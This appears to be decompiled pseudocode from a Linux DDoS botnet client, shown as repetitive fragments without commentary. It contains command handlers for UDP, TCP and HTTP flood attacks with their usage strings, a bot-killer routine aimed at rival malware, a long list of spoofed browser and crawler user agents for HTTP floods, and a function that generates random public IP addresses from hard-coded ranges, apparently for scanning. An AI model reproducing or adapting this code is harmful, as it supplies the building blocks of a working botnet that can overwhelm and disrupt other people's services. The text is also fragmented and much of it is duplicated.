                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                        sockprintf(v212, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10020000);
                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                        sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                    if (listFork() == 0) {
                                                                        sendTCP(v265, v266, v267, v268, v269, v229, v230);
                                                                        while (true) {
                                                                            if (listFork() == 0) {
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                    if (listFork() == 0) {
                                                        sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                        while (true) {
                                                            if (listFork() == 0) {
                    if (listFork() == 0) {
                        v281 = __GI_inet_ntoa(&v224, (int32_t)&v214);
                        v287 = sockprintf(v223, (int32_t)"COMMENCING BOT KILL ON -> %s", v281);
                        botkiller(v287);
                if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                    v282 = __GI_inet_ntoa(&v224, (int32_t)&v214);
                    sockprintf(v223, (int32_t)"My Public IP: %s", v282);
                    if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                sockprintf(v212, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10020000);
                                                                    if (listFork() == 0) {
                                                                        sendUDP(v253, v254, v255, v256, v257, v225, v231);
                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendTCP(v265, v266, v267, v268, v269, v229, v230);
                                                                                                        while (true) {
                                                                                                            if (listFork() == 0) {
                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                        if (listFork() == 0) {
                                                                                                            sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                            while (true) {
                                                                                                                if (listFork() == 0) {
                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                    if (listFork() == 0) {
                                                                                        sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                        while (true) {
                                                                                            if (listFork() == 0) {
                                                                        while (true) {
                                                                            if (listFork() == 0) {
                                                            if (listFork() == 0) {
                                                                sendUDP(v253, v254, v255, v256, v257, v225, v231);
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                            if (listFork() == 0) {
                                                                                                sendTCP(v265, v266, v267, v268, v269, v229, v230);
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP(*v248, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                    while (true) {
                                                                                                        if (listFork() == 0) {
                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                            if (listFork() == 0) {
                                                                                sendHTTP(*v248, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                                while (true) {
                                                                    if (listFork() == 0) {
                        sockprintf(v212, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10020000);
                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                    if (listFork() == 0) {
                                                        sendTCP(v265, v266, v267, v268, v269, v229, v230);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v248, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                            while (true) {
                                                                if (listFork() == 0) {
                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                    if (listFork() == 0) {
                                        sendHTTP(*v248, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                        while (true) {
                                            if (listFork() == 0) {
=================FUNCTION : _init ===================
++++++++ FUNCTION START 320
++++++++ FUNCTION END 1339
++++++++ FUNCTION LENGTH 1019
        "etrbhhgetrb",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
        "Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
        "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
        "Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/",
        "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
        "zspider/0.9-dev http://feedback.redkolibri.com/",
        "Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",
        "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
        "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",
        "TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)",
        "FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
        "FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
        "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
        "FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
        "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
        "findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
        "AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
        "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",
        "MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",
        "Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0",
        "Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)",
        "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
        "msnbot/0.9 (+http://search.msn.com/msnbot.htm)",
        "msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
        "MSNBOT/0.1 (http://search.msn.com/msnbot.htm)",
        "Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)",
        "Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)",
        "NetResearchServer/4.0(loopimprovements.com/robot.html)",
        "NetResearchServer/3.5(loopimprovements.com/robot.html)",
        "NetResearchServer/2.8(loopimprovements.com/robot.html)",
        "NetResearchServer/2.7(loopimprovements.com/robot.html)",
        "NetResearchServer/2.5(loopimprovements.com/robot.html)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
        "Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET ",
        "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "Gigabot/3.0 (http://www.gigablast.com/spider.html)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "Rome Client (http://tinyurl.com/64t5n) Ver: 0.9",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",
        "Rome Client (http://tinyurl.com/64t5n) Ver: 0.9",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3",
        "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
        "HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)",
        "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
        "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",
        "Wget/1.12 (linux-gnu)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3",
        "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
        "HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)",
        "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
        "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)",
        "wget",
        "botnet",
        "swatnet",
        "fucknet",
        "cracknet",
        "weednet",
        "gaynet",
        "queernet",
        "ballnet",
        "unet",
        "/dev/netslink/",
=================FUNCTION : GetRandomPublicIP ===================
++++++++ FUNCTION START 12510
++++++++ FUNCTION END 13427
++++++++ FUNCTION LENGTH 917
    v216 = random() % 255;
    v217 = random() % 255;
    v218 = random() % 255;
    v219 = random() % 255;
    int32_t v220 = random() % 115; // 0x10003364
        szprintf((int32_t)&v221, (int32_t)"43.252.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"43.239.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"85.3.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"37.158.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"95.9.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"41.252.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"58.71.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"104.55.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"78.186.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"78.189.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"77.209.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"88.5.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"43.239.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"103.20.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"103.47.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"103.57.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"45.117.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"101.51.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"137.59.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"1.56.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"1.188.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.204.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"27.0.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"27.8.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"27.50.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"27.54.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"27.98.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"27.112.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"27.192.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"36.32.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"36.248.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"39.64.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"42.4.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"42.48.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"42.52.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"42.56.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"42.63.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"42.84.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"42.176.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"42.224.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"42.176.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"60.0.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"60.16.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"163.53.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"62.30.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"62.252.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"62.254.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"62.255.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"77.96.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"77.97.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"77.98.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"77.100.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"77.102.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"113.191.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"81.100.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"113.188.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"113.189.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"94.174.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.160.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.161.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.162.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.163.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.164.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.165.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.166.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.167.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.168.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.169.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.170.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.171.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.172.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.173.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.174.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.175.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.176.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.177.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.178.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.179.%d.%d", (int32_t)v218);
